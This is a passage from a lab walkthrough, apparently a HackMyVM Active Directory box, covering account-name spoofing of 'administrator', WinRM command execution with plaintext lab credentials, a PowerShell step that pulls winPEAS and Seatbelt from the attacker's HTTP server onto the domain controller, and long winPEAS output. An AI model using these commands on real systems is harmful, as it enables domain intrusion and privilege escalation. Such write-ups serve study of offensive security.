└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u 'IT-admin' -p 'V9bT6itAdmin2026' get object 'administrator ' --attr sAMAccountName --attr userPrincipalName --attr objectSid

distinguishedName: CN=IT-login-user,CN=Users,DC=lookback,DC=htb
objectSid: S-1-5-21-3830242231-3868280746-2763890440-1112
```

### Ending
> + **用户名显示为 **`**lookback\administrator**`（无尾部空格，系统已自动 trim）。
> + **SID 为 **`**S-1-5-21-3830242231-3868280746-2763890440-1112**`，这是 `IT-login-user` 的原始 SID（RID 1112），**不是**内置管理员 RID 500。
> + **组成员仅有 **`**LOOKBACK\IT**`** 等普通组**，无 `Domain Admins`。
> + **特权仅包含 **`**SeMachineAccountPrivilege**`**（允许将计算机加入域）和 **`**SeChangeNotifyPrivilege**`，无高权限。
>
> **结论**：改名成功实现了**用户名冒充**，但**权限未提升**。这是一个典型的“名称欺骗”而非“权限劫持”。该账户目前可用于基于名称的证书注册攻击（如 AD CS ESC1），但无法直接 DCSync
>

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q nxc winrm 172.16.55.128 -d lookback.htb -u 'administrator ' -p 'ITLogin!2026#Qw' -X "whoami /all"
WINRM       172.16.55.128   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.55.128   5985   DC01             [+] lookback.htb\administrator :ITLogin!2026#Qw (Pwn3d!)                                                                                                    
WINRM       172.16.55.128   5985   DC01             [+] Executed command (shell type: powershell)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             USER INFORMATION
WINRM       172.16.55.128   5985   DC01             ----------------
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             User Name               SID
WINRM       172.16.55.128   5985   DC01             ======================= ==============================================                                                                                      
WINRM       172.16.55.128   5985   DC01             lookback\administrator  S-1-5-21-3830242231-3868280746-2763890440-1112                                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             GROUP INFORMATION
WINRM       172.16.55.128   5985   DC01             -----------------
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             Group Name                                  Type             SID                                            Attributes                                      
WINRM       172.16.55.128   5985   DC01             =========================================== ================ ============================================== ==================================================                                                                                                      
WINRM       172.16.55.128   5985   DC01             Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             LOOKBACK\IT                                 Group            S-1-5-21-3830242231-3868280746-2763890440-1109 Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group                                                                                                      
WINRM       172.16.55.128   5985   DC01             Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                    
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             PRIVILEGES INFORMATION
WINRM       172.16.55.128   5985   DC01             ----------------------
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             Privilege Name                Description                    State                                                                                          
WINRM       172.16.55.128   5985   DC01             ============================= ============================== =======                                                                                        
WINRM       172.16.55.128   5985   DC01             SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                        
WINRM       172.16.55.128   5985   DC01             SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                        
WINRM       172.16.55.128   5985   DC01             SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             USER CLAIMS INFORMATION
WINRM       172.16.55.128   5985   DC01             -----------------------
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             User claims unknown.
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             Kerberos support for Dynamic Access Control on this device has been disabled.                      
```

# Final Ending-ESC9弱证书映射
## winpeas&Seatbelt
### upload
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q nxc winrm '172.16.55.128' -d 'lookback.htb' -u 'administrator ' -p 'ITLogin!2026#Qw' -X '$ProgressPreference="SilentlyContinue"; Invoke-WebRequest -UseBasicParsing -Uri "http://172.16.55.193:8000/winPEASx64.exe" -OutFile "C:\ProgramData\winPEASx64.exe"; Invoke-WebRequest -UseBasicParsing -Uri "http://172.16.55.193:8000/Seatbelt.exe" -OutFile "C:\ProgramData\Seatbelt.exe"; Get-Item "C:\ProgramData\Seatbelt.exe","C:\ProgramData\winPEASx64.exe" | Select-Object FullName,Length'
WINRM       172.16.55.128   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.55.128   5985   DC01             [+] lookback.htb\administrator :ITLogin!2026#Qw (Pwn3d!)                                                                                                    
WINRM       172.16.55.128   5985   DC01             [+] Executed command (shell type: powershell)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             FullName                        Length
WINRM       172.16.55.128   5985   DC01             --------                        ------
WINRM       172.16.55.128   5985   DC01             C:\ProgramData\Seatbelt.exe     556032
WINRM       172.16.55.128   5985   DC01             C:\ProgramData\winPEASx64.exe 10170880
WINRM       172.16.55.128   5985   DC01    
```

```plain
┌──(web)─(root㉿kali)-[/home/…/hmv/lookback/myself/tools]
└─# updog -p 8000
[+] Serving /home/kali/Desktop/hmv/lookback/myself/tools on 0.0.0.0:8000...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://61.139.2.134:8000
Press CTRL+C to quit
172.16.55.128 - - [11/Apr/2026 07:07:50] "GET /winPEASx64.exe HTTP/1.1" 200 -
172.16.55.128 - - [11/Apr/2026 07:07:50] "GET /Seatbelt.exe HTTP/1.1" 200 -
```

### run
```plain
┌──(kali㉿kali)-[~]
└─$ proxychains -q nxc winrm '172.16.55.128' -d 'lookback.htb' -u 'administrator ' -p 'ITLogin!2026#Qw' -X 'Start-Process -FilePath "C:\ProgramData\winPEASx64.exe" -ArgumentList "quiet" -RedirectStandardOutput "C:\ProgramData\winpeas_out.txt" -RedirectStandardError "C:\ProgramData\winpeas_err.txt" -WindowStyle Hidden -Wait; Get-Item "C:\ProgramData\winpeas_out.txt","C:\ProgramData\winpeas_err.txt" | Select-Object FullName,Length'
WINRM       172.16.55.128   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.55.128   5985   DC01             [+] lookback.htb\administrator :ITLogin!2026#Qw (Pwn3d!)
WINRM       172.16.55.128   5985   DC01             [+] Executed command (shell type: powershell)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             FullName                       Length
WINRM       172.16.55.128   5985   DC01             --------                       ------
WINRM       172.16.55.128   5985   DC01             C:\ProgramData\winpeas_out.txt 129138
WINRM       172.16.55.128   5985   DC01             C:\ProgramData\winpeas_err.txt      0
```

### content
```plain
┌──(kali㉿kali)-[~]
└─$ proxychains -q nxc winrm '172.16.55.128' -d 'lookback.htb' -u 'administrator ' -p 'ITLogin!2026#Qw' -X 'Get-Content "C:\ProgramData\winpeas_out.txt"'
WINRM       172.16.55.128   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:lookback.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.55.128   5985   DC01             [+] lookback.htb\administrator :ITLogin!2026#Qw (Pwn3d!)                                                                                                    
WINRM       172.16.55.128   5985   DC01             [+] Executed command (shell type: powershell)
WINRM       172.16.55.128   5985   DC01              [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help                             
WINRM       172.16.55.128   5985   DC01             ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD                                                   
WINRM       172.16.55.128   5985   DC01             Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD                                                             
WINRM       172.16.55.128   5985   DC01               WinPEAS-ng by @hacktricks_live
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                    /---------------------------------------------------------------------------------\                                                                  
WINRM       172.16.55.128   5985   DC01                    |                             Do you like PEASS?                                  |                                                                  
WINRM       172.16.55.128   5985   DC01                    |---------------------------------------------------------------------------------|                                                                  
WINRM       172.16.55.128   5985   DC01                    |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                  
WINRM       172.16.55.128   5985   DC01                    |         Follow on Twitter         :     @hacktricks_live                        |                                                                  
WINRM       172.16.55.128   5985   DC01                    |         Respect on HTB            :     SirBroccoli                             |                                                                  
WINRM       172.16.55.128   5985   DC01                    |---------------------------------------------------------------------------------|                                                                  
WINRM       172.16.55.128   5985   DC01                    |                                 Thank you!                                      |                                                                  
WINRM       172.16.55.128   5985   DC01                    \---------------------------------------------------------------------------------/                                                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               [+] Legend:
WINRM       172.16.55.128   5985   DC01                      Red                Indicates a special privilege over an object or something is misconfigured                                                      
WINRM       172.16.55.128   5985   DC01                      Green              Indicates that some protection is enabled or something is well configured                                                       
WINRM       172.16.55.128   5985   DC01                      Cyan               Indicates active users
WINRM       172.16.55.128   5985   DC01                      Blue               Indicates disabled users
WINRM       172.16.55.128   5985   DC01                      LightYellow        Indicates links
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01              You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html              
WINRM       172.16.55.128   5985   DC01                Creating Dynamic lists, this could take a while, please wait...                                                                                          
WINRM       172.16.55.128   5985   DC01                - Loading sensitive_files yaml definitions file...                                                                                                       
WINRM       172.16.55.128   5985   DC01                - Loading regexes yaml definitions file...
WINRM       172.16.55.128   5985   DC01                - Checking if domain...
WINRM       172.16.55.128   5985   DC01                - Getting Win32_UserAccount info...
WINRM       172.16.55.128   5985   DC01             Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied                                                            
WINRM       172.16.55.128   5985   DC01                at System.Management.ThreadDispatch.Start()
WINRM       172.16.55.128   5985   DC01                at System.Management.ManagementScope.Initialize()
WINRM       172.16.55.128   5985   DC01                at System.Management.ManagementObjectSearcher.Initialize()                                                                                               
WINRM       172.16.55.128   5985   DC01                at System.Management.ManagementObjectSearcher.Get()                                                                                                      
WINRM       172.16.55.128   5985   DC01                at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                 
WINRM       172.16.55.128   5985   DC01                - Creating current user groups list...
WINRM       172.16.55.128   5985   DC01                - Creating active users list (local only)...
WINRM       172.16.55.128   5985   DC01               [X] Exception: Object reference not set to an instance of an object.                                                                                      
WINRM       172.16.55.128   5985   DC01                - Creating disabled users list...
WINRM       172.16.55.128   5985   DC01               [X] Exception: Object reference not set to an instance of an object.                                                                                      
WINRM       172.16.55.128   5985   DC01                - Admin users list...
WINRM       172.16.55.128   5985   DC01               [X] Exception: Object reference not set to an instance of an object.                                                                                      
WINRM       172.16.55.128   5985   DC01                - Creating AppLocker bypass list...
WINRM       172.16.55.128   5985   DC01                - Creating files/directories list for search...
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                              
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
WINRM       172.16.55.128   5985   DC01             È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                                                                                
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access is denied
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
WINRM       172.16.55.128   5985   DC01               [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).            
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)                                                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Last Shutdown Date/time        :    4/10/2026 8:46:46 PM                                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
WINRM       172.16.55.128   5985   DC01             È Check for some passwords or keys in the env variables                                                                                                     
WINRM       172.16.55.128   5985   DC01                 COMPUTERNAME: DC01
WINRM       172.16.55.128   5985   DC01                 PUBLIC: C:\Users\Public
WINRM       172.16.55.128   5985   DC01                 LOCALAPPDATA: C:\Users\administrator .LOOKBACK\AppData\Local
WINRM       172.16.55.128   5985   DC01                 PSModulePath: C:\Users\administrator .LOOKBACK\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\PowerShell\Modules\
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_ARCHITECTURE: AMD64
WINRM       172.16.55.128   5985   DC01                 Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\DTS\Binn\;C:\Users\administrator .LOOKBACK\AppData\Local\Microsoft\WindowsApps
WINRM       172.16.55.128   5985   DC01                 CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
WINRM       172.16.55.128   5985   DC01                 ProgramFiles(x86): C:\Program Files (x86)
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_LEVEL: 25
WINRM       172.16.55.128   5985   DC01                 ProgramFiles: C:\Program Files
WINRM       172.16.55.128   5985   DC01                 PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
WINRM       172.16.55.128   5985   DC01                 USERPROFILE: C:\Users\administrator .LOOKBACK
WINRM       172.16.55.128   5985   DC01                 SystemRoot: C:\Windows
WINRM       172.16.55.128   5985   DC01                 ALLUSERSPROFILE: C:\ProgramData
WINRM       172.16.55.128   5985   DC01                 DriverData: C:\Windows\System32\Drivers\DriverData
WINRM       172.16.55.128   5985   DC01                 ProgramData: C:\ProgramData
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_REVISION: 4401
WINRM       172.16.55.128   5985   DC01                 USERNAME: administrator
WINRM       172.16.55.128   5985   DC01                 CommonProgramW6432: C:\Program Files\Common Files
WINRM       172.16.55.128   5985   DC01                 CommonProgramFiles: C:\Program Files\Common Files
WINRM       172.16.55.128   5985   DC01                 OS: Windows_NT
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 68 Stepping 1, AuthenticAMD
WINRM       172.16.55.128   5985   DC01                 ComSpec: C:\Windows\system32\cmd.exe
WINRM       172.16.55.128   5985   DC01                 SystemDrive: C:
WINRM       172.16.55.128   5985   DC01                 TEMP: C:\Users\ADMINI~1.LOO\AppData\Local\Temp
WINRM       172.16.55.128   5985   DC01                 NUMBER_OF_PROCESSORS: 4
WINRM       172.16.55.128   5985   DC01                 APPDATA: C:\Users\administrator .LOOKBACK\AppData\Roaming
WINRM       172.16.55.128   5985   DC01                 TMP: C:\Users\ADMINI~1.LOO\AppData\Local\Temp
WINRM       172.16.55.128   5985   DC01                 ProgramW6432: C:\Program Files
WINRM       172.16.55.128   5985   DC01                 windir: C:\Windows
WINRM       172.16.55.128   5985   DC01                 USERDOMAIN: LOOKBACK
WINRM       172.16.55.128   5985   DC01                 USERDNSDOMAIN: lookback.htb
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
WINRM       172.16.55.128   5985   DC01             È Check for some passwords or keys in the env variables                                                                                                     
WINRM       172.16.55.128   5985   DC01                 ComSpec: C:\Windows\system32\cmd.exe
WINRM       172.16.55.128   5985   DC01                 DriverData: C:\Windows\System32\Drivers\DriverData
WINRM       172.16.55.128   5985   DC01                 OS: Windows_NT
WINRM       172.16.55.128   5985   DC01                 Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\Tools\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files\Microsoft SQL Server\160\DTS\Binn\
WINRM       172.16.55.128   5985   DC01                 PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_ARCHITECTURE: AMD64
WINRM       172.16.55.128   5985   DC01                 PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\160\Tools\PowerShell\Modules\
WINRM       172.16.55.128   5985   DC01                 TEMP: C:\Windows\TEMP
WINRM       172.16.55.128   5985   DC01                 TMP: C:\Windows\TEMP
WINRM       172.16.55.128   5985   DC01                 USERNAME: SYSTEM
WINRM       172.16.55.128   5985   DC01                 windir: C:\Windows
WINRM       172.16.55.128   5985   DC01                 NUMBER_OF_PROCESSORS: 4
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_LEVEL: 25
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 68 Stepping 1, AuthenticAMD
WINRM       172.16.55.128   5985   DC01                 PROCESSOR_REVISION: 4401
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
WINRM       172.16.55.128   5985   DC01             È Check what is being logged 
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced                                                                                                     
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
WINRM       172.16.55.128   5985   DC01             È Windows Event Forwarding, is interesting to know were are sent the logs                                                                                   
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
WINRM       172.16.55.128   5985   DC01             È If installed, local administrator password is changed frequently and is restricted by ACL                                                                 
WINRM       172.16.55.128   5985   DC01                 LAPS Enabled: LAPS not installed
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
WINRM       172.16.55.128   5985   DC01             È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest                                                                                                      
WINRM       172.16.55.128   5985   DC01                 Wdigest is not enabled
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
WINRM       172.16.55.128   5985   DC01             È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection             
WINRM       172.16.55.128   5985   DC01                 LSA Protection is not enabled
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
WINRM       172.16.55.128   5985   DC01             È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard                                                                                                 
WINRM       172.16.55.128   5985   DC01                 CredentialGuard is not enabled
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
WINRM       172.16.55.128   5985   DC01             È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials                                                               
WINRM       172.16.55.128   5985   DC01                 cachedlogonscount is 10
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)                                                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
WINRM       172.16.55.128   5985   DC01               [X] Exception: Invalid namespace 
WINRM       172.16.55.128   5985   DC01                 No AV was detected!!
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
WINRM       172.16.55.128   5985   DC01               Local Settings
WINRM       172.16.55.128   5985   DC01               Group Policy Settings
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
WINRM       172.16.55.128   5985   DC01             È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss                                 
WINRM       172.16.55.128   5985   DC01                 ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries                                                                                             
WINRM       172.16.55.128   5985   DC01                 EnableLUA: 1
WINRM       172.16.55.128   5985   DC01                 LocalAccountTokenFilterPolicy: 
WINRM       172.16.55.128   5985   DC01                 FilterAdministratorToken: 
WINRM       172.16.55.128   5985   DC01                   [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.                                                                         
WINRM       172.16.55.128   5985   DC01                   [-] Only the RID-500 local admin account can be used for lateral movement.                                                                            
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
WINRM       172.16.55.128   5985   DC01                 PowerShell v2 Version: 2.0
WINRM       172.16.55.128   5985   DC01                 PowerShell v5 Version: 5.1.20348.1
WINRM       172.16.55.128   5985   DC01                 PowerShell Core Version: 
WINRM       172.16.55.128   5985   DC01                 Transcription Settings: 
WINRM       172.16.55.128   5985   DC01                 Module Logging Settings: 
WINRM       172.16.55.128   5985   DC01                 Scriptblock Logging Settings: 
WINRM       172.16.55.128   5985   DC01                 PS history file: 
WINRM       172.16.55.128   5985   DC01                 PS history size: 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry                                                                                     
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
WINRM       172.16.55.128   5985   DC01             È Read the PS history inside these files (if any)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
WINRM       172.16.55.128   5985   DC01                 CertificateRevocation: 1
WINRM       172.16.55.128   5985   DC01                 DisableCachingOfSSLPages: 0
WINRM       172.16.55.128   5985   DC01                 IE5_UA_Backup_Flag: 5.0
WINRM       172.16.55.128   5985   DC01                 PrivacyAdvanced: 1
WINRM       172.16.55.128   5985   DC01                 SecureProtocols: 10240
WINRM       172.16.55.128   5985   DC01                 User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
WINRM       172.16.55.128   5985   DC01                 ZonesSecurityUpgrade: System.Byte[]
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
WINRM       172.16.55.128   5985   DC01                 ActiveXCache: C:\Windows\Downloaded Program Files
WINRM       172.16.55.128   5985   DC01                 CodeBaseSearchPath: CODEBASE
WINRM       172.16.55.128   5985   DC01                 EnablePunycode: 1
WINRM       172.16.55.128   5985   DC01                 MinorVersion: 0
WINRM       172.16.55.128   5985   DC01                 WarnOnIntranet: 1
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
WINRM       172.16.55.128   5985   DC01             È Remember that you should search more info inside the other drives                                                                                         
WINRM       172.16.55.128   5985   DC01                 C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 41 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])                                   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus                                                     
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup                                               
WINRM       172.16.55.128   5985   DC01               The system is inside a domain (LOOKBACK) so it could be vulnerable.                                                                                       
WINRM       172.16.55.128   5985   DC01             È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges                                                                                   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
